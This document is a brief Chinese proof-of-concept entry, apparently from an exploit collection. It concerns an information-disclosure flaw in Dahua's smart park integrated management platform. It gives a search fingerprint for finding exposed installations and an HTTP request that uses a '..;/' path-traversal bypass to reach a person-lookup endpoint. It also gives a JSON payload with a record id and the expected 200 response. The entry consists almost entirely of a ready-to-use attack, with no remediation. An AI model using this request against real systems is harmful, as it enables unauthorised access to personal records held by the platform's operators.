# 大华-智慧园区综合管理平台queryById存在信息泄露漏洞

大华 ｜ 信息泄露 ｜ —
- **指纹**：`app="dahua-智慧园区综合管理平台"`
- **请求**：`POST /CardSolution/card/visitor/appointment/..;/..;/..;/card/person/queryById HTTP/1.1`

**Payload**
```
{"id":8}
```
- **响应特征**：200